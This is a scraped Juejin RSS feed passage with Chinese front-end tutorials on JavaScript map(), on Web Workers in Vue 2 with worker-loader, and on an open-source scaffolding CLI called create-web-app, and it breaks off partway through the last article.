<span class="hljs-keyword">const</span> mapped = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mapped); <span class="hljs-comment">// [2, 4, 6]</span>

<span class="hljs-comment">// forEach() 不返回值（返回 undefined）</span>
<span class="hljs-keyword">const</span> forEachResult = numbers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(forEachResult); <span class="hljs-comment">// undefined</span>
</code></pre>
<h3 data-id="heading-12">实际项目示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// API 数据处理</span>
<span class="hljs-keyword">const</span> apiResponse = [
  { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Post 1'</span>, <span class="hljs-attr">body</span>: <span class="hljs-string">'Content 1'</span>, <span class="hljs-attr">userId</span>: <span class="hljs-number">1</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Post 2'</span>, <span class="hljs-attr">body</span>: <span class="hljs-string">'Content 2'</span>, <span class="hljs-attr">userId</span>: <span class="hljs-number">2</span> },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Post 3'</span>, <span class="hljs-attr">body</span>: <span class="hljs-string">'Content 3'</span>, <span class="hljs-attr">userId</span>: <span class="hljs-number">1</span> }
];

<span class="hljs-comment">// 转换为前端需要的格式</span>
<span class="hljs-keyword">const</span> formattedPosts = apiResponse.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">post</span> =&gt;</span> ({
  <span class="hljs-attr">postId</span>: post.<span class="hljs-property">id</span>,
  <span class="hljs-attr">title</span>: post.<span class="hljs-property">title</span>.<span class="hljs-title function_">toUpperCase</span>(),
  <span class="hljs-attr">content</span>: post.<span class="hljs-property">body</span>,
  <span class="hljs-attr">authorId</span>: post.<span class="hljs-property">userId</span>,
  <span class="hljs-attr">createdAt</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
}));

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(formattedPosts);
</code></pre>
<p><code>map()</code> 方法是函数式编程风格的重要组成部分，它使代码更加简洁、可读，并且避免了副作用，是现代 JavaScript 开发中不可或缺的工具。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[webWorker 初步体验]]></title>    <link>https://juejin.cn/post/7575742632334557234</link>    <guid>https://juejin.cn/post/7575742632334557234</guid>    <pubDate>2025-11-24T07:20:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575742632334557234" data-draft-id="7575456858428244014" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="webWorker 初步体验"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T07:20:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Nayana"/> <meta itemprop="url" content="https://juejin.cn/user/1679709498509534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            webWorker 初步体验
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1679709498509534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Nayana
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:20:59.000Z" title="Mon Nov 24 2025 07:20:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h5 data-id="heading-0">‌webWorker是什么？</h5>
<p>Web Worker是HTML5引入的浏览器多线程技术，允许在独立线程中执行后台任务，避免阻塞主线程从而提升Web应用性能。</p>
<h5 data-id="heading-1">为什么要使用Web Work？</h5>
<p>浏览器渲染的js线程是单线程 这意味着各子任务的执行是串行的在同一时间内只能执行一个任务。当大量计算密集型/DOM操作的任务出现时阻塞UI。</p>
<h3 data-id="heading-2">初体验记录</h3>
<p>在实现大文件计算MD5时考虑到提升性能时了解到<code>Web Worker</code>， 那么来看看在vue2项目中如何使用Web Worker的吧</p>
<h4 data-id="heading-3">栗子</h4>
<h5 data-id="heading-4">编写一个独立的脚本</h5>
<p>（如<code>*.worker.js</code>）定义对应的线程逻辑</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">handlerMsg</span>(<span class="hljs-params">parames</span>){
*****
<span class="hljs-keyword">return</span>  result
}

onmessage = <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
	<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">handlerMsg</span>(e.<span class="hljs-property">parames</span>)<span class="hljs-comment">//模拟一个耗时任务</span>
       <span class="hljs-keyword">if</span>(result){
       <span class="hljs-comment">//发送成功的信息</span>
       <span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">result</span>: result, <span class="hljs-attr">status</span>: <span class="hljs-string">'done'</span> });
       }<span class="hljs-keyword">else</span>{
       <span class="hljs-comment">//发送错误</span>
        <span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">error</span>:<span class="hljs-string">'error'</span> ,<span class="hljs-attr">status</span>: <span class="hljs-string">'error'</span>  });
       }
};
</code></pre>
<h5 data-id="heading-5">线程使用</h5>
<h6 data-id="heading-6">文件引入</h6>
<ol>
<li>将webWorker 脚本文件放置到pubilc文件夹下（<strong>注意</strong>： public 目录下的文件不会被 webpack 处理，所以你不能直接使用 ES6 的 import 语句来引入其他文件）</li>
<li>将webWorker 脚本文件放置src下的文件夹中则需要使用<code>worker-loader</code></li>
</ol>
<p>重点描述下使用<code>worker-loader</code></p>
<ol>
<li>安装<code>worker-loader</code></li>
</ol>
<pre><code class="hljs language-js" lang="js">npm i -D worker-loader
</code></pre>
<ol start="2">
<li>配置loader</li>
</ol>
<p>确保在Webpack配置中正确处理了<code>.worker.js</code>文件的加载，你可能需要在Vue CLI的配置文件中添加一个规则来支持worker的导入</p>
<pre><code class="hljs language-js" lang="js">	
	<span class="hljs-attr">chainWebpack</span>: <span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> {
		****
		config.<span class="hljs-property">module</span>
		.<span class="hljs-title function_">rule</span>(<span class="hljs-string">'worker'</span>)
		.<span class="hljs-title function_">test</span>(<span class="hljs-regexp">/\.worker\.js$/</span>)
		.<span class="hljs-title function_">use</span>(<span class="hljs-string">'worker-loader'</span>)
		.<span class="hljs-title function_">loader</span>(<span class="hljs-string">'worker-loader'</span>)
		.<span class="hljs-title function_">end</span>();
		
		<span class="hljs-comment">// 解决：worker 热更新问题</span>
		config.<span class="hljs-property">module</span>
		  .<span class="hljs-title function_">rule</span>(<span class="hljs-string">'js'</span>)
		  .<span class="hljs-property">exclude</span>
		  .<span class="hljs-title function_">add</span>(<span class="hljs-regexp">/\.worker\.js$/</span>)
		  .<span class="hljs-title function_">end</span>();
   
		<span class="hljs-comment">// 解决：“window is undefined”报错，这个是因为worker线程中不存在window对象，因此不能直接使用，要用this代替</span>
		config.<span class="hljs-property">output</span>.<span class="hljs-title function_">globalObject</span>(<span class="hljs-string">'this'</span>)
 

	},
</code></pre>
<h6 data-id="heading-7">在Vue组件中使用</h6>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">MyWorker</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../js/md5Worker.worker'</span>;
	<span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyWorker</span>();
	worker.<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">parames</span>: parames }); <span class="hljs-comment">// 发送参数给worker处理</span>
	worker.<span class="hljs-property">onmessage</span> = <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> {
	<span class="hljs-keyword">if</span> (e.<span class="hljs-property">data</span>.<span class="hljs-property">status</span> === <span class="hljs-string">'done'</span>) {
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'result:'</span>, e.<span class="hljs-property">data</span>.<span class="hljs-property">result</span>);
	worker.<span class="hljs-title function_">terminate</span>(); <span class="hljs-comment">// 完成工作后终止worker</span>
	} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e.<span class="hljs-property">data</span>.<span class="hljs-property">status</span> === <span class="hljs-string">'error'</span>) {
	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Error:'</span>, e.<span class="hljs-property">data</span>.<span class="hljs-property">error</span>); <span class="hljs-comment">// 处理错误情况</span>
	worker.<span class="hljs-title function_">terminate</span>(); <span class="hljs-comment">// 终止worker以释放资源</span>
	}
	};

</code></pre>
<h3 data-id="heading-8">注意事项</h3>
<ul>
<li>‌<strong>同源限制</strong>‌：Worker脚本需与主线程同源。</li>
<li>‌<strong>数据传输优化</strong>‌：大文件建议使用Transferable Objects（如<code>ArrayBuffer</code>）减少拷贝开销。</li>
<li>‌<strong>错误处理</strong>‌：监听<code>worker.onerror</code>捕获异常并处理。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【开源】create-web-app：多引擎可插拔的前端脚手架]]></title>    <link>https://juejin.cn/post/7575829296452386826</link>    <guid>https://juejin.cn/post/7575829296452386826</guid>    <pubDate>2025-11-24T07:47:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575829296452386826" data-draft-id="7575748159609782298" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【开源】create-web-app：多引擎可插拔的前端脚手架"/> <meta itemprop="keywords" content="前端,JavaScript,架构"/> <meta itemprop="datePublished" content="2025-11-24T07:47:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="吃饺子不吃馅"/> <meta itemprop="url" content="https://juejin.cn/user/1148309742825495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【开源】create-web-app：多引擎可插拔的前端脚手架
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1148309742825495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    吃饺子不吃馅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:47:21.000Z" title="Mon Nov 24 2025 07:47:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>为什么需要它</strong></h2>
<ul>
<li>新项目起步总是重复劳动：选 React/Vue、JS/TS、Vite/Webpack、是否加 Router/Lint/状态管理、还要补企业规范</li>
<li>官方脚手架偏“起项目”，不擅长“统一团队规范”与“快速扩展插件”</li>
<li>create-web-app 把这些选项收敛到一次顺滑的交互里，并支持直达模式一键生成</li>
</ul>
<h2 data-id="heading-1"><strong>核心能力</strong></h2>
<ul>
<li>多引擎模式
<ul>
<li>原生引擎：内置 React/Vue 模板，按需启用插件、选择打包器，生成后即可跑。</li>
<li>外部引擎代理：一键代理 create-vite、Umi、Next、CRA 等，保留后续扩展空间</li>
</ul>
</li>
<li>可插拔插件系统
<ul>
<li>插件用“配置”描述依赖、文件、转换，不写脚手架逻辑也能增强模板。</li>
<li>内置 Router、ESLint+Prettier、状态管理（Zustand/Redux/Pinia）、打包器（Vite/Webpack）等。</li>
</ul>
</li>
<li>自由选择打包器
<ul>
<li>选择 Vite 或 Webpack，自动覆盖 <code>scripts</code> 和依赖，模板随上下文调整。</li>
<li>Webpack 下自动移除 Vite 入口脚本；React 模板启用 <code>runtime: 'automatic'</code>，避免“React 未定义”</li>
</ul>
</li>
<li>直达模式与交互式
<ul>
<li>交互式引导；也支持命令行选项直达，无需任何提问</li>
</ul>
</li>
<li>TypeScript/HTML 智能调整
<ul>
<li>TS 下自动生成 <code>tsconfig.json</code>，并针对打包器设定 <code>moduleResolution</code>。</li>
<li>Vue 模板自动生成 <code>env.d.ts</code>（Webpack）或 <code>vite-env.d.ts</code>（Vite），避免类型告警</li>
</ul>
</li>
</ul>
<h2 data-id="heading-2"><strong>快速开始</strong></h2>
<pre><code class="hljs language-bash" lang="bash">npm i dc-create-web-app -g
</code></pre>
<ul>
<li>全局安装并使用：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">create-web-app my-app
</code></pre>
<ul>
<li>直达模式（跳过交互）：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">create-web-app my-app --engine native --framework react --language ts --bundler webpack --plugins router,lint,zustand
</code></pre>
<ul>
<li>在仓库脚本里透传参数（注意 <code>--</code>）：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">pnpm dev -- --engine native --framework vue --language ts --bundler vite --plugins router,pinia
</code></pre>
<h2 data-id="heading-3"><strong>你会得到</strong></h2>
<ul>
<li>结构清晰的项目目录、可用的开发/构建脚本、合理的依赖</li>
<li>根据选择自动生成/清理配置（如选择 Webpack 时删除 <code>vite.config.*</code> 并注入 <code>HtmlWebpackPlugin</code>）</li>
<li>TS 场景自动写入 <code>tsconfig.json</code> 与类型依赖，React/Vue 的类型与入口随打包器自动修正</li>
<li>Router/状态管理/Lint 等插件按需启用，不强迫绑定</li>
</ul>
<h2 data-id="heading-4"><strong>典型组合示例</strong></h2>
<ul>
<li>React + TS + Webpack + Router + Lint：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">create-web-app my-app --engine native --framework react --language ts --bundler webpack --plugins router,lint
</code></pre>
<ul>
<li>Vue + Vite 快速开发：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">create-web-app my-app --engine native --framework vue --language js --bundler vite
</code></pre>
<ul>
<li>直接用 create-vite（交给官方交互）：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">create-web-app my-app --engine vite --framework react
</code></pre>
<h2 data-id="heading-5"><strong>架构与实现要点</strong></h2>
<ul>
<li>交互与直达解析：<code>run.js</code> 聚合 CLI 选项与交互选择，统一生成摘要与最终配置</li>
